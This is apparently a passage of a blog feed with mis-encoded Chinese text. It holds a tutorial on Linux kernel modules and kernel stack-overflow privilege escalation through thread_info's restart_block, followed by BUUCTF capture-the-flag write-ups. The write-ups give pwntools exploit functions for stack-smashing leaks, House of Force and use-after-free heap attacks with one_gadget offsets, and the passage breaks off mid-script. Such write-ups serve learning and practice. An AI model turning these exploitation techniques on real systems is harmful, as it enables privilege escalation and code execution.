ä¸ºæ‰€æœ‰çš„å†…å®¹éƒ½é›†åˆåœ¨ä¸€èµ·ï¼Œä½†ç¼ºç‚¹æ˜¯å¯æ‰©å±•æ€§å’Œå¯ç»´æŠ¤æ€§ç›¸å¯¹è¾ƒå·®ï¼Œæ¨¡å—æœºåˆ¶å°±æ˜¯ä¸ºäº†å¼¥è¡¥è¿™ä¸€ç¼ºé™·ã€‚</p></blockquote><p><strong>é€šå¸¸æƒ…å†µä¸‹ï¼ŒKernelæ¼æ´çš„å‘ç”Ÿä¹Ÿå¸¸è§äºåŠ è½½çš„LKMså‡ºç°é—®é¢˜ã€‚</strong></p><h3 id="å†…æ ¸ä¸­çš„æ¨¡å—ç›¸å…³å‘½ä»¤"><a href="#å†…æ ¸ä¸­çš„æ¨¡å—ç›¸å…³å‘½ä»¤" class="headerlink" title="å†…æ ¸ä¸­çš„æ¨¡å—ç›¸å…³å‘½ä»¤"></a>å†…æ ¸ä¸­çš„æ¨¡å—ç›¸å…³å‘½ä»¤</h3><ol><li>insmodï¼šå°†æŒ‡å®šæ¨¡å—åŠ è½½åˆ°å†…æ ¸ä¸­ã€‚</li><li>rmmodï¼šä»å†…æ ¸ä¸­å¸è½½æŒ‡å®šæ¨¡å—ã€‚</li><li>lsmodï¼šåˆ—å‡ºå·²ç»åŠ è½½çš„æ¨¡å—ã€‚</li><li>modprobeï¼šæ·»åŠ æˆ–åˆ é™¤æ¨¡å—ï¼Œmodprobeåœ¨åŠ è½½æ¨¡å—æ—¶ä¼šæŸ¥æ‰¾ä¾èµ–å…³ç³»ã€‚</li></ol><h3 id="file-operations-ç»“æ„ä½“"><a href="#file-operations-ç»“æ„ä½“" class="headerlink" title="file_operations ç»“æ„ä½“"></a>file_operations ç»“æ„ä½“</h3><p>ç”¨æˆ·è¿›ç¨‹åœ¨å¯¹è®¾å¤‡æ–‡ä»¶è¿›è¡Œè¯¸å¦‚read/writeæ“ä½œçš„æ—¶å€™ï¼Œ<strong>ç³»ç»Ÿè°ƒç”¨é€šè¿‡è®¾å¤‡æ–‡ä»¶çš„ä¸»è®¾å¤‡å·æ‰¾åˆ°ç›¸åº”çš„è®¾å¤‡é©±åŠ¨ç¨‹åºï¼Œç„¶åè¯»å–è¿™ä¸ªæ•°æ®ç»“æ„ç›¸åº”çš„å‡½æ•°æŒ‡é’ˆï¼Œæ¥ç€æŠŠæ§åˆ¶æƒäº¤ç»™è¯¥å‡½æ•°ï¼Œè¿™æ˜¯linuxçš„è®¾å¤‡é©±åŠ¨ç¨‹åºå·¥ä½œçš„åŸºæœ¬åŸç†ã€‚</strong></p><p>å†…æ ¸æ¨¡å—ç¨‹åºçš„ç»“æ„ä¸­åŒ…æ‹¬ä¸€äº›call backå›è°ƒè¡¨ï¼Œå¯¹åº”çš„å‡½æ•°å­˜å‚¨åœ¨ä¸€ä¸ªfile_operations(fop)ç»“æ„ä½“ä¸­ï¼Œè¿™ä¹Ÿæ˜¯ç›¸å½“é‡è¦çš„ç»“æ„ä½“ï¼Œç»“æ„ä½“ä¸­å®ç°äº†çš„å›è°ƒå‡½æ•°å°±ä¼šé™æ€åˆå§‹åŒ–å‡½æ•°åœ°å€ï¼Œè€Œæœªå®ç°çš„å‡½æ•°ï¼Œå€¼ä¸ºNULLã€‚</p><p>ä¾‹å¦‚ï¼š</p><div class="table-container"><table><thead><tr><th style="text-align:center">Events</th><th style="text-align:center">User functions</th><th style="text-align:center">Kernel functions</th></tr></thead><tbody><tr><td style="text-align:center">Load</td><td style="text-align:center">insmod</td><td style="text-align:center">module_init()</td></tr><tr><td style="text-align:center">Open</td><td style="text-align:center">fopen</td><td style="text-align:center">file_operations: open</td></tr><tr><td style="text-align:center">Close</td><td style="text-align:center">fread</td><td style="text-align:center">file_operations: read</td></tr><tr><td style="text-align:center">Write</td><td style="text-align:center">fwrite</td><td style="text-align:center">file_operations: write</td></tr><tr><td style="text-align:center">Close</td><td style="text-align:center">fclose</td><td style="text-align:center">file_operations: release</td></tr><tr><td style="text-align:center">Remove</td><td style="text-align:center">rmmod</td><td style="text-align:center">module_exit()</td></tr></tbody></table></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Hello world!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Bye, cruel worldn&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    read: module_read,</span><br><span class="line">    write: module_write,</span><br><span class="line">    open: module_open,</span><br><span class="line">    release: module_release</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œmodule_init/module_exitæ˜¯åœ¨è½½å…¥/å¸è½½è¿™ä¸ªé©±åŠ¨æ—¶è‡ªåŠ¨è¿è¡Œï¼›è€Œfopç»“æ„ä½“å®ç°äº†å¦‚ä¸Šå››ä¸ªcallbackï¼Œå†’å·å³ä¾§çš„å‡½æ•°åæ˜¯ç”±å¼€å‘è€…è‡ªå·±èµ·çš„ï¼Œåœ¨é©±åŠ¨ç¨‹åºè½½å…¥å†…æ ¸åï¼Œå…¶ä»–ç”¨æˆ·ç¨‹åºå°±å¯ä»¥å€ŸåŠ©æ–‡ä»¶æ–¹å¼åƒè¿›è¡Œç³»ç»Ÿè°ƒç”¨ä¸€æ ·è°ƒç”¨è¿™äº›å‡½æ•°å®ç°æ‰€éœ€åŠŸèƒ½ã€‚</p><h2 id="04-ç¯å¢ƒé…ç½®"><a href="#04-ç¯å¢ƒé…ç½®" class="headerlink" title="04. ç¯å¢ƒé…ç½®"></a>04. ç¯å¢ƒé…ç½®</h2><p>å¯¹äºkernel pwnæ¥è¯´ï¼Œé¢˜ç›®é€šå¸¸ä¼šç»™å®šä»¥ä¸‹æ–‡ä»¶ï¼š</p><blockquote><p>boot.shï¼šä¸€ä¸ªç”¨äºå¯åŠ¨kernelçš„shellè„šæœ¬ï¼Œå¤šç”¨qemuï¼Œä¿æŠ¤æªæ–½ä¸qemuä¸åŒçš„å¯åŠ¨å‚æ•°æœ‰å…³</p><p>bzImageï¼škernel binary</p><p>rootfs.cpioï¼šæ–‡ä»¶ç³»ç»Ÿæ˜ åƒ</p></blockquote><p>qemuçš„å¯åŠ¨å‚æ•°ï¼š</p><ul><li>-initrd rootfs.cpioï¼Œä½¿ç”¨rootfs.cpioä½œä¸ºå†…æ ¸å¯åŠ¨çš„æ–‡ä»¶ç³»ç»Ÿ</li><li>-kernel bzImageï¼Œä½¿ç”¨bzImageä½œä¸ºkernelæ˜ åƒ</li><li>-cpu kvm64,+smepï¼Œè®¾ç½®CPUçš„å®‰å…¨é€‰é¡¹ï¼Œè¿™é‡Œå¼€å¯äº†smep</li><li>-m 64Mï¼Œè®¾ç½®è™šæ‹ŸRAMä¸º64Mï¼Œé»˜è®¤ä¸º128M</li></ul><h2 id="05-Kernel-Stack-Overflow"><a href="#05-Kernel-Stack-Overflow" class="headerlink" title="05. Kernel Stack Overflow"></a>05. Kernel Stack Overflow</h2><h3 id="å†…æ ¸æ ˆå¸§-Kernel-Stack-Layout"><a href="#å†…æ ¸æ ˆå¸§-Kernel-Stack-Layout" class="headerlink" title="å†…æ ¸æ ˆå¸§(Kernel Stack Layout)"></a>å†…æ ¸æ ˆå¸§(Kernel Stack Layout)</h3><p>x86ä¸Šçš„Linuxå†…æ ¸å †æ ˆçš„å¤§å°ä¸º4096æˆ–8192å­—èŠ‚ï¼Œå–å†³äºå‘è¡Œç‰ˆã€‚</p><p>å†…æ ¸å †æ ˆä¸thread_infoç»“æ„å…±äº«4k/8kçš„æ€»å¤§å°ï¼Œè¯¥ç»“æ„åŒ…å«æœ‰å…³å½“å‰çº¿ç¨‹çš„ä¸€äº›å…ƒæ•°æ®ï¼Œå¦‚include/linux/sched.hä¸­æ‰€ç¤º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">thread_union</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>thread_infoç»“æ„ä½“åœ¨x86ä¸‹æœ‰å¦‚ä¸‹å®šä¹‰ï¼ˆarch/x86/include/asm/thread_info.hï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span> *<span class="title">exec_domain</span>;</span></span><br><span class="line">    __u32      flags;</span><br><span class="line">    __u32      status;</span><br><span class="line">    __u32      cpu;</span><br><span class="line">    <span class="keyword">int</span>          preempt_count;</span><br><span class="line">    <span class="keyword">mm_segment_t</span>  addr_limit;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> <span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">void</span> __user     *sysenter_return;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  previous_esp;</span><br><span class="line">    __u8      supervisor_stack[<span class="number">0</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span>          uaccess_err;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å†…æ ¸å †æ ˆåœ¨å†…å­˜ä¸­å‘ˆç°ä¸‹æ‰€ç¤ºçš„ç»“æ„</p><p><img src="https://img.lhyerror404.cn/error404/2020-03-15-061423.png" alt=""></p><p>å½“å†…æ ¸å‡½æ•°éœ€è¦è¶…è¿‡4k/8kçš„å †æ ˆç©ºé—´æˆ–è€…ä½¿ç”¨äº†é•¿è°ƒç”¨é“¾ä»¥è‡³äºè¶…å‡ºå¯ç”¨å †æ ˆç©ºé—´çš„æ—¶å€™ï¼Œä¼šå¯¼è‡´å †æ ˆæº¢å‡ºçš„å‘ç”Ÿï¼Œå¹¶ä¸”å¦‚æœthread_infoç»“æ„æˆ–è¶…å‡ºæ›´ä½åœ°å€å¤„çš„å…³é”®å†…å­˜æŸåï¼Œåˆ™ä¼šå¯¼è‡´å†…æ ¸å´©æºƒã€‚ä½†æ˜¯ï¼Œå¦‚æœå†…å­˜å¯¹é½å¹¶ä¸”å­˜åœ¨å®é™…å¯ä»¥æ§åˆ¶å†™å…¥å †æ ˆåŠå…¶ä»¥å¤–çš„æ•°æ®çš„æƒ…å†µï¼Œåˆ™å¯èƒ½å­˜åœ¨å¯åˆ©ç”¨çš„æ¡ä»¶ã€‚</p><h3 id="kernelæ ˆæº¢å‡ºæ”»å‡»"><a href="#kernelæ ˆæº¢å‡ºæ”»å‡»" class="headerlink" title="kernelæ ˆæº¢å‡ºæ”»å‡»"></a>kernelæ ˆæº¢å‡ºæ”»å‡»</h3><p>æˆ‘ä»¬çœ‹ä¸€çœ‹æ ˆæº¢å‡ºå’Œthread_infoç»“æ„çš„ç ´åæ˜¯å¦‚ä½•å¯¼è‡´ææƒçš„å‘ç”Ÿçš„ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">blah</span><span class="params">(<span class="keyword">int</span> __user *vals, <span class="keyword">int</span> __user count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> big_array[count];</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; count; ++count) &#123;</span><br><span class="line">    big_array[i] = vals[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šä»£ç ä½¿ç”¨äº†å¯å˜é•¿åº¦çš„æ•°ç»„ï¼Œå…¶å¤§å°åŸºäºæ”»å‡»è€…çš„countã€‚c99å…è®¸ä½¿ç”¨å¯å˜é•¿çš„æ•°ç»„ï¼Œå¹¶ä¸”GCCæ”¯æŒå¯å˜é•¿çš„æ•°ç»„ã€‚GCCå°†åœ¨è¿è¡Œçš„æ—¶å€™ç®€å•åœ°è®¡ç®—å¿…è¦çš„å¤§å°ï¼Œå¹¶é€‚å½“å‡å°‘å †æ ˆæŒ‡é’ˆï¼Œä»¥åœ¨å †æ ˆä¸Šä¸ºæ•°ç»„åˆ†é…ç©ºé—´ã€‚</p><p>æˆ‘ä»¬å¦‚æœæä¾›ä¸€ä¸ªæå¤§çš„countï¼Œåˆ™å †æ ˆå¯èƒ½å‘ä¸‹æ‰©å±•åˆ°thread_infoçš„è¾¹ç•Œä¹‹å¤–ï¼Œä»è€Œå…è®¸æ”»å‡»è€…éšåå°†ä»»æ„å€¼å†™å…¥è¯¥ç»“æ„ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„targetä¸ºthread_infoç»“æ„ä¸­çš„ä¸€ä¸ªæˆå‘˜ï¼šrestart_blockã€‚è¯¥æˆå‘˜æ˜¯æ¯ä¸ªçº¿ç¨‹çš„ç»“æ„ï¼Œç”¨äºè·Ÿè¸ªä¿¡æ¯å’Œå‚æ•°ä»¥ä¾›é‡æ–°å¯åŠ¨ç³»ç»Ÿè°ƒç”¨ã€‚å¦‚æœåœ¨sigaction(2)ä¸­æŒ‡å®šäº†SA_RESTARTï¼Œåˆ™è¢«ä¿¡å·ä¸­æ–­çš„ç³»ç»Ÿè°ƒç”¨å¯ä»¥ä¸­æ­¢å¹¶è¿”å›EINTRï¼Œä¹Ÿå¯ä»¥è‡ªåŠ¨è‡ªè¡Œé‡å¯ã€‚åœ¨include/linux/thread_info.hä¸­ï¼Œrestart_blockçš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(struct restart_block *);</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">/* For futex_wait and futex_wait_requeue_pi */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; futex;</span><br><span class="line">        <span class="comment">/* For nanosleep */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; nanosleep;</span><br><span class="line">        <span class="comment">/* For poll */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; poll;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªfnçš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨kernel/signal.cä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE0(restart_syscall)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> *<span class="title">restart</span> =</span> &amp;current_thread_info()-&gt;restart_block;</span><br><span class="line">    <span class="keyword">return</span> restart-&gt;fn(restart);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œrestart_syscallåœ¨arch/x86/kernel/syscall_table_32.Sä¸­è¢«å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.<span class="keyword">long</span> sys_restart_syscall <span class="comment">/* 0 - old &quot;setup()&quot; system call, used for restarting */</span></span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šå®ƒçš„ç³»ç»Ÿè°ƒç”¨å·ä¸º0ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä»ç”¨æˆ·æ€ä¸­è°ƒç”¨å…¶åŠŸèƒ½ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">syscall(SYS_restart_syscall);</span><br></pre></td></tr></table></figure><p>è¿™å°†ä½¿å†…æ ¸è°ƒç”¨åœ¨restart_blockç»“æ„ä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>å¦‚æœæˆ‘ä»¬å¯ä»¥ç ´åthread_infoä¸­çš„restart_blockæˆå‘˜ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œåˆ™å¯ä»¥å°†å…¶æŒ‡å‘æˆ‘ä»¬æ§åˆ¶ä¸‹çš„ç”¨æˆ·ç©ºé—´ä¸­çš„å‡½æ•°ï¼Œé€šè¿‡è°ƒç”¨sys_restart_syscallè§¦å‘å…¶æ‰§è¡Œï¼Œå¹¶ææƒã€‚</p><h3 id="Linuxææƒæ€è·¯"><a href="#Linuxææƒæ€è·¯" class="headerlink" title="Linuxææƒæ€è·¯"></a>Linuxææƒæ€è·¯</h3><p>ä¹‹å‰è¯´è¿‡ï¼Œæ‰§è¡Œcommit_creds(prepare_kernel_cred(0))ï¼Œå¯ä»¥ä½¿è¿›ç¨‹çš„æƒé™æå‡ä¸ºrootï¼Œç„¶åæˆ‘ä»¬è¿”å›åˆ°ç”¨æˆ·æ¨¡å¼ï¼Œæ‰§è¡ŒiretæŒ‡ä»¤ã€‚</p><p>å…³äºiretæŒ‡ä»¤ï¼š</p><ul><li><p>å½“ä½¿ç”¨iretæŒ‡ä»¤è¿”å›åˆ°ç›¸åŒä¿æŠ¤çº§åˆ«çš„ä»»åŠ¡æ—¶ï¼Œiretä¼šä»å †æ ˆå¼¹å‡ºä»£ç æ®µé€‰æ‹©å­åŠæŒ‡ä»¤æŒ‡é’ˆåˆ†åˆ«åˆ°CSä¸IPå¯„å­˜å™¨ï¼Œå¹¶å¼¹å‡ºæ ‡å¿—å¯„å­˜å™¨å†…å®¹åˆ°EFLAGSå¯„å­˜å™¨ã€‚</p></li><li><p>å½“ä½¿ç”¨iretæŒ‡ä»¤è¿”å›åˆ°ä¸€ä¸ªä¸åŒä¿æŠ¤çº§åˆ«æ—¶ï¼Œiretä¸ä»…ä¼šä»å †æ ˆå¼¹å‡ºä»¥ä¸Šå†…å®¹ï¼Œè¿˜ä¼šå¼¹å‡ºå †æ ˆæ®µé€‰æ‹©å­åŠå †æ ˆæŒ‡é’ˆåˆ†åˆ«åˆ°SSä¸SPå¯„å­˜å™¨ã€‚</p></li><li><p>æ ˆä¸Šä¿å­˜äº†trap frameï¼Œè¿”å›åˆ°ç”¨æˆ·æ¨¡å¼çš„æ—¶å€™ï¼Œæ¢å¤ä¿¡æ¯ä»ä»¥ä¸‹çš„ç»“æ„è¯»å–ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>* eip;                <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> cs;              <span class="comment">// code segment    +4</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;          <span class="comment">// CPU flags       +8</span></span><br><span class="line">    <span class="keyword">void</span>* esp;                <span class="comment">// stack pointer       +12</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ss;              <span class="comment">// stack segment   +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFç¬¬ä¸‰å‘¨</title>
      <link href="2021/08/05/BUUCTF%E7%AC%AC%E4%B8%89%E5%91%A8/"/>
      <url>2021/08/05/BUUCTF%E7%AC%AC%E4%B8%89%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h2><p>ï¼ˆè¾ƒæ˜“ï¼‰è€ƒç‚¹ï¼š</p><ul><li>forkå­è¿›ç¨‹</li><li>stack smashing</li><li>åˆ©ç”¨environç¡®å®šä»»æ„æ ˆåœ°å€</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Please type your guessing flag&quot;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    libc_base = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">&quot;__environ&quot;</span>]</span><br><span class="line">    sla(<span class="string">&#x27;Please type your guessing flag&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(environ))</span><br><span class="line">    flag = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - <span class="number">0x168</span></span><br><span class="line">    sla(<span class="string">&quot;Please type your guessing flag&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(flag))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><p>ï¼ˆè¾ƒéš¾ï¼‰è€ƒç‚¹ï¼š</p><ul><li>mmapæ³„éœ²å †åœ°å€</li><li>House of Force</li><li>realloc_hookè°ƒæ•´æ ˆå¸§ä½¿ogç”Ÿæ•ˆ</li></ul><p>å¡åœ¨äº†æ³„éœ²åœ°å€è¿™ä¸ªç‚¹ï¼Œå­¦åˆ°äº†mmapå‡ºæ¥çš„ç©ºé—´ç›¸é‚»libcçš„åœ°å€</p><p>house of forceæ”¹top chunkçš„åœ°å€ä¸º-1(0xfffâ€¦)</p><p>ç„¶åæ— é™ç”³è¯·ï¼Œç®—ä¸‹malloc_hookçš„åç§»åˆ°topchunkï¼Œç„¶åç”³è¯·åˆ°é™„è¿‘æ”¹é‚£ä¸¤ä¸ªhook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    libc_base = add(<span class="number">0x200000</span>, <span class="string">&#x27;mmap&#x27;</span>) + <span class="number">0x201000</span> - <span class="number">0x10</span></span><br><span class="line">    echo(<span class="string">&quot;base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    one_addr = add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)) - <span class="number">0x10</span></span><br><span class="line">    size = (libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]) - (one_addr + <span class="number">0x20</span>) - <span class="number">0x40</span></span><br><span class="line">    echo(<span class="built_in">hex</span>(size))</span><br><span class="line">    add(size, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">    binsh = add(<span class="number">0x40</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(libc_base + og[<span class="number">1</span>]) + p64(libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    gdba()</span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>, <span class="built_in">str</span>(<span class="number">0xdead</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-buffer-overflow-0"><a href="#picoctf-2018-buffer-overflow-0" class="headerlink" title="picoctf_2018_buffer overflow 0"></a>picoctf_2018_buffer overflow 0</h2><p>ï¼ˆè¾ƒæ˜“ï¼‰è€ƒç‚¹ï¼š</p><ul><li>æ ˆæº¢å‡º</li><li>signalè°ƒç”¨åé—¨å‡½æ•°</li></ul><p>sshè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œè¿è¡Œå‡½æ•°é€šè¿‡å‘½ä»¤è¡Œä¼ å…¥å‚æ•°ç„¶åæ³„éœ²å‡ºflag</p><h2 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h2><p>ï¼ˆä¸­ç­‰ï¼‰è€ƒç‚¹ï¼š</p><ul><li>UAF</li><li>å †å¸ƒå±€æ„é€ unsorted bin</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sa(<span class="string">&quot;&gt; Input your code please:&quot;</span>, <span class="string">&quot;OreOOrereOOreO&quot;</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>),<span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>))</span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">&quot;RE is &quot;</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) - <span class="number">0x80</span></span><br><span class="line">    echo(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">&#x27;\x00&#x27;</span>, p64(heap + <span class="number">0x10</span>))</span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>), <span class="number">0x30</span>, payload)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc_base = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">4</span>, p64(<span class="number">0</span>), p64(libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    </span><br><span class="line">    og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">    payload = <span class="number">0x13</span> * <span class="string">&#x27;\x00&#x27;</span> + p64(libc.address + og[<span class="number">3</span>])</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add(0x50, p64(0xdeadbeef), 0x40, &#x27;hello&#x27;)</span></span><br><span class="line">    